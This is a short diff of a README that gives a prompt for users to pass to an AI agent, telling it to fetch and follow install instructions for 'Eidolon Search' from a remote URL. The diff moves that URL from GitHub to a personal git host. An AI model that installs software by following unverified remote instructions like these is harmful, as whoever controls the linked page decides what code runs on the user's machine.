@@ -35,7 +35,7 @@ Pass this prompt to your AI agent:
 
 ```
 Read and install Eidolon Search by following the instructions here:
-https://raw.githubusercontent.com/openclaw/eidolon-search/main/README.en.md
+https://git.kwonluna.co.kr/openclaw/eidolon-search/raw/branch/master/README.en.md
 
 Then use it to search memory files efficiently.
 ```
